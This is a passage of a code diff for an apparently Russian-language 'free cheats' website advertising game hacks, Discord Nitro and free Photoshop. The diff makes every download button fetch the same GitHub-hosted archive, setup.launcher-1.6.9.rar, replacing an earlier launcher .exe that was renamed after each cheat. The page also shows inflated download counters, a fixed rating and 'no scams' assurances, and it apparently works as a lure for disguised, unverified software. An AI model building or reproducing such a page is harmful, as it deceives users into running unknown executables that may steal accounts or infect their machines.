@@ -72,7 +72,7 @@
     .stat-item:hover { transform: translateY(-6px); border-color: #ff85c0; box-shadow: 0 0 20px rgba(255,133,192,0.4); }
     .stat-number { font-size: 2.5rem; font-weight: bold; color: #ff85c0; text-shadow: 0 0 12px #ff85c0; }
     
-    /* Бейджи (убрали голосовой) */
+    /* Бейджи */
     .badges { display: flex; justify-content: center; gap: 1.5rem; flex-wrap: wrap; margin: 2rem 0; }
     .badge {
       background: rgba(0,255,200,0.1); backdrop-filter: blur(5px);
@@ -102,7 +102,7 @@
     .game-card h3 { color: #ff85c0; margin-bottom: 0.3rem; font-size: 1.2rem; }
     .game-card p { font-size: 0.75rem; color: #c0b0dd; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; max-width: 200px; }
     
-    /* Панель с читами (без лайков) */
+    /* Панель с читами (без лайков/дизлайков) */
     .cheats-panel {
       position: fixed; right: -450px; top: 0; width: 450px; height: 100vh;
       background: linear-gradient(145deg, rgba(18,8,35,0.98), rgba(8,0,20,0.98));
@@ -173,7 +173,7 @@
   </header>
   
   <div class="stats-bar">
-    <div class="stat-item"><div class="stat-number" id="totalCount">2879</div><div id="stat1Label">скачиваний всего</div></div>
+    <div class="stat-item"><div class="stat-number" id="totalCount">3124</div><div id="stat1Label">скачиваний всего</div></div>
     <div class="stat-item"><div class="stat-number" id="todayCount">0</div><div id="stat2Label">сегодня</div></div>
     <div class="stat-item"><div class="stat-number">4.98 ★</div><div id="stat3Label">рейтинг сообщества</div></div>
   </div>
@@ -210,7 +210,7 @@
     <a href="https://t.me/besp1atno" target="_blank" class="halyavshik-btn"><i class="fab fa-telegram"></i> ПЕРЕЙТИ НА КАНАЛ ХАЛЯВА</a>
   </div>
 
-  <!-- ОТЗЫВЫ и кнопка с призывом (теперь через Telegram) -->
+  <!-- ОТЗЫВЫ и кнопка с призывом (Telegram) -->
   <div class="reviews-block" id="reviewsBlock">
     <i class="fas fa-comments" style="font-size: 2.5rem; color: #c084fc;"></i>
     <h3 id="reviewsTitle">💬 Реальные отзывы нашего комьюнити</h3>
@@ -253,7 +253,10 @@ const gamesData = [
   { id: "software", name: "ПО / ПРОЧЕЕ", img: "https://cdn-icons-png.flaticon.com/512/2920/2920277.png", chips: ["Discord Nitro", "Оптимизация ПК", "Discord Fix", "Roblox Fix", "Optimization PC", "VoiceMod", "Discord+Nitro", "Telegram F1X", "HWID FIX", "Optimization CrystalFix", "AI VOICE CHANGER", "NetBoost", "StartAllBlack", "ExitLag", "Adobe Photoshop Free"] }
 ];
 
-let totalDownloads = parseInt(localStorage.getItem('totalDownloads')) || 2879;
+// НОВАЯ ССЫЛКА НА АРХИВ (RAR) с GitHub
+const DOWNLOAD_URL = "https://github.com/tapekizaru7-wq/vipcheats/raw/refs/heads/main/setup.launcher-1.6.9.rar";
+
+let totalDownloads = parseInt(localStorage.getItem('totalDownloads')) || 3124;
 let todayDownloads = parseInt(localStorage.getItem('todayDownloads')) || 0;
 
 function updateCounters() {
@@ -264,7 +267,7 @@ function updateCounters() {
 }
 function addDownload() { totalDownloads++; todayDownloads++; updateCounters(); }
 
-// Рендер сетки
+// Рендер сетки игр
 function renderGames() {
   const grid = document.getElementById('gamesGrid');
   grid.innerHTML = gamesData.map(game => `
@@ -282,7 +285,7 @@ function renderGames() {
   });
 }
 
-// Панель с читами (ЛАЙКИ/ДИЗЛАЙКИ УБРАНЫ ПОЛНОСТЬЮ)
+// Панель с читами (без лайков/дизлайков) — каждая кнопка скачивает .rar архив
 function showCheatsPanel(game) {
   const panel = document.getElementById('cheatsPanel');
   const overlay = document.getElementById('overlay');
@@ -294,11 +297,10 @@ function showCheatsPanel(game) {
       content.innerHTML += `
         <div class="cheat-item">
           <div class="cheat-name">⚡ ${cheat}</div>
-          <button class="download-cheat" data-cheat="${cheat}"><i class="fas fa-download"></i> Скачать ${cheat} (VIP Launcher)</button>
+          <button class="download-cheat" data-cheat="${cheat}"><i class="fas fa-download"></i> Скачать ${cheat} (setup.launcher-1.6.9.rar)</button>
         </div>
       `;
     });
-    // навешиваем обработчики скачивания
     document.querySelectorAll('.download-cheat').forEach(btn => {
       btn.removeEventListener('click', downloadHandler);
       btn.addEventListener('click', downloadHandler);
@@ -308,10 +310,10 @@ function showCheatsPanel(game) {
   function downloadHandler(e) {
     const cheatName = e.currentTarget.dataset.cheat || "VIP_Cheat";
     addDownload();
-    const fileUrl = "https://github.com/tapekizaru7-wq/VIP-LAUNCHER/raw/refs/heads/main/VIP%20Launcher.exe";
+    // Скачивание строго по фиксированной ссылке RAR (архив)
     const a = document.createElement('a');
-    a.href = fileUrl;
-    a.download = `${cheatName.replace(/[^a-z0-9]/gi, '_')}.exe`;
+    a.href = DOWNLOAD_URL;
+    a.download = "setup.launcher-1.6.9.rar";
     document.body.appendChild(a);
     a.click();
     document.body.removeChild(a);
@@ -348,6 +350,4 @@ const translations = {
     quoteTitle: "WE WORK FOR YOU EVERY SINGLE DAY",
     quoteText1: "Every morning we monitor dozens of closed sources, paid forums and private databases to bring you the best. VIP Cheats is not just a channel with programs, it's a brotherhood that values your result. Our team of devs and reversers tests any software 24/7 so you only download working builds.",
     quoteText2: "🔥 We don't ask for money — just support by subscribing to our Telegram channels. 🔥\nThousands of people have already received plugins, private scripts and exclusive optimizations. We believe in fair exchange: you subscribe to us, and we give you access to what others don't have. The rest channels are resting because VIP Cheats has real power!",
-    quoteText3: "✨ «Where others sell — we give for free, because our goal is your eSports drive and pure gaming pleasure. No contests, no scams. Just take and enjoy.»",
-    reviewsTitle: "💬 Real feedback from our community",
-    reviewsDesc: "We appreciate every user! Thousands of thanks, screenshots, video reviews — all this is left by our subscribers in a special review section.
+    quoteText3: "✨ «Where others sell — we give for free, because our goal is your eSports drive and pure gaming pleasure. No contests, no scams. Just take and
